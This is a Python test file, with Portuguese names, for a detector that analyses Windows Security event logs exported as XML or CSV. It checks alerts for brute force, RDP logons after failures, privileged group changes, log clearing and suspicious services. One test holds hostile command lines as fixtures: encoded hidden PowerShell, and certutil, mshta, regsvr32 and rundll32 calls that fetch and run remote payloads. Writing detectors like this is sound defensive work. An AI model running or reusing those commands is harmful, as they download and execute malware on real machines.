"""Eventos de segurança do Windows exportados em XML (wevtutil) ou CSV."""

from __future__ import annotations

from pathlib import Path

from fakes_logs import evento_xml, fato_logs, momento
from helpers import run_check

ID = "logs.analise"
IP = "93.184.216.34"
ADMINS = "S-1-5-32-544"


def _xml(tmp_path: Path, eventos: list[str], nome: str = "security.xml") -> Path:
    arq = tmp_path / nome
    arq.write_text("\n".join(eventos), encoding="utf-8")
    return arq


def _rodar(tmp_path: Path, eventos: list[str]):
    return run_check(ID, fato_logs(_xml(tmp_path, eventos)))


def _falha(seg: int, ip: str = IP, usuario: str = "administrator") -> str:
    return evento_xml(4625, seg, {"TargetUserName": usuario, "IpAddress": ip, "LogonType": "3"})


def _logon(seg: int, ip: str = IP, tipo: str = "10", usuario: str = "administrator") -> str:
    return evento_xml(4624, seg, {"TargetUserName": usuario, "IpAddress": ip, "LogonType": tipo})


def test_forca_bruta_4625(tmp_path: Path) -> None:
    out = _rodar(tmp_path, [_falha(i * 3) for i in range(15)])
    achado = next(f for f in out.findings if f.check_id == "logs.windows.forca_bruta")
    assert IP in achado.title


def test_poucas_falhas_de_senha_nao_alertam(tmp_path: Path) -> None:
    out = _rodar(tmp_path, [_falha(i * 3) for i in range(3)])
    assert "logs.windows.forca_bruta" not in out.ids()


def test_rdp_apos_falhas(tmp_path: Path) -> None:
    out = _rodar(tmp_path, [_falha(i) for i in range(10)] + [_logon(60)])
    assert "logs.windows.rdp_apos_falhas" in out.ids()


def test_logon_rdp_sem_falhas_e_normal(tmp_path: Path) -> None:
    out = _rodar(tmp_path, [_logon(60, "198.51.100.8", usuario="ana")])
    assert not out.findings


def test_logon_de_rede_apos_falhas_nao_e_rdp(tmp_path: Path) -> None:
    out = _rodar(tmp_path, [_falha(i) for i in range(10)] + [_logon(60, tipo="3")])
    assert "logs.windows.rdp_apos_falhas" not in out.ids()


def test_usuario_criado(tmp_path: Path) -> None:
    ev = evento_xml(4720, 5, {"TargetUserName": "suporte2", "SubjectUserName": "intruso"})
    assert "logs.windows.usuario_criado" in _rodar(tmp_path, [ev]).ids()


def test_conta_de_maquina_criada_nao_alerta(tmp_path: Path) -> None:
    ev = evento_xml(4720, 5, {"TargetUserName": "PC77$", "SubjectUserName": "joiner"})
    assert "logs.windows.usuario_criado" not in _rodar(tmp_path, [ev]).ids()


def test_grupo_privilegiado(tmp_path: Path) -> None:
    ev = evento_xml(
        4732,
        5,
        {
            "MemberSid": "S-1-5-21-1-2-3-1105",
            "TargetSid": ADMINS,
            "TargetUserName": "Administrators",
        },
    )
    assert "logs.windows.grupo_privilegiado" in _rodar(tmp_path, [ev]).ids()


def test_grupo_comum_nao_alerta(tmp_path: Path) -> None:
    ev = evento_xml(
        4732,
        5,
        {
            "MemberSid": "S-1-5-21-1-2-3-1105",
            "TargetSid": "S-1-5-21-1-2-3-2200",
            "TargetUserName": "Vendas",
        },
    )
    assert "logs.windows.grupo_privilegiado" not in _rodar(tmp_path, [ev]).ids()


def test_log_apagado_1102(tmp_path: Path) -> None:
    ev = evento_xml(1102, 5, {"SubjectUserName": "intruso"}, provedor="Microsoft-Windows-Eventlog")
    assert "logs.windows.log_apagado" in _rodar(tmp_path, [ev]).ids()


def _servico(caminho: str) -> str:
    return evento_xml(
        7045,
        5,
        {"ServiceName": "svc2", "ImagePath": caminho},
        provedor="Service Control Manager",
    )


def test_servico_em_pasta_gravavel_e_mais_grave_que_em_program_files(tmp_path: Path) -> None:
    ruim = _rodar(tmp_path, [_servico(r"C:\Users\Public\svc.exe")])
    (tmp_path / "security.xml").unlink()
    bom = _rodar(tmp_path, [_servico(r"C:\Program Files\Fabricante\servico.exe")])
    ordem = ["info", "low", "medium", "high", "critical"]
    assert ordem.index(ruim.findings[0].severity.value) > ordem.index(
        bom.findings[0].severity.value
    )


def _proc(linha: str) -> str:
    return evento_xml(4688, 5, {"CommandLine": linha, "NewProcessName": linha.split()[0]})


def test_comandos_suspeitos(tmp_path: Path) -> None:
    codificado = "A" * 40
    comandos = [
        f"powershell.exe -nop -w hidden -enc {codificado}",
        "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe",
        "mshta.exe http://198.51.100.9/x.hta",
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
        "regsvr32.exe /s /n /u /i:http://198.51.100.9/x.sct scrobj.dll",
    ]
    out = _rodar(tmp_path, [_proc(c) for c in comandos])
    assert "logs.windows.comando_suspeito" in out.ids()


def test_comandos_normais_nao_alertam(tmp_path: Path) -> None:
    comandos = [
        r"C:\Windows\System32\notepad.exe C:\notas.txt",
        "powershell.exe -File C:\\scripts\\backup.ps1",
        "certutil.exe -hashfile arquivo.iso SHA256",
        "rundll32.exe shell32.dll,Control_RunDLL",
    ]
    out = _rodar(tmp_path, [_proc(c) for c in comandos])
    assert not out.findings
    assert out.passed


def test_xml_com_utf16(tmp_path: Path) -> None:
    arq = tmp_path / "security.xml"
    arq.write_bytes("\n".join(_falha(i * 3) for i in range(15)).encode("utf-16"))
    assert "logs.windows.forca_bruta" in run_check(ID, fato_logs(arq)).ids()


def _linha_csv(id: int, seg: int, mensagem: str) -> str:
    t = momento(seg)
    texto = mensagem.replace('"', '""')
    data = f"{t:%m/%d/%Y %I:%M:%S %p}"
    return f'Information,{data},Microsoft-Windows-Security-Auditing,{id},Logon,"{texto}"'


def _msg_4625(ip: str) -> str:
    return (
        "An account failed to log on.\n\nSubject:\n\tSecurity ID:\tS-1-0-0\n\tAccount Name:\t-\n\n"
        "Logon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\tS-1-0-0\n"
        "\tAccount Name:\tadministrator\n\nNetwork Information:\n"
        f"\tWorkstation Name:\tWIN\n\tSource Network Address:\t{ip}\n\tSource Port:\t5000\n"
    )


CABECALHO_CSV = "Level,Date and Time,Source,Event ID,Task Category,Message"


def test_csv_do_visualizador_de_eventos(tmp_path: Path) -> None:
    linhas = [CABECALHO_CSV] + [_linha_csv(4625, i * 3, _msg_4625(IP)) for i in range(15)]
    arq = tmp_path / "security.csv"
    arq.write_text("\n".join(linhas) + "\n", encoding="utf-8")
    out = run_check(ID, fato_logs(arq))
    assert "logs.windows.forca_bruta" in out.ids()


def test_csv_sem_indicios_gera_ponto_forte(tmp_path: Path) -> None:
    arq = tmp_path / "security.csv"
    arq.write_text(
        "\n".join([CABECALHO_CSV, _linha_csv(4625, 1, _msg_4625(IP))]) + "\n", encoding="utf-8"
    )
    out = run_check(ID, fato_logs(arq))
    assert not out.findings
    assert out.passed


def test_csv_qualquer_nao_e_tratado_como_evento(tmp_path: Path) -> None:
    arq = tmp_path / "vendas.csv"
    arq.write_text("produto,preco\ncaneta,2\nlapis,1\n", encoding="utf-8")
    out = run_check(ID, fato_logs(arq))
    assert not out.findings and not out.passed
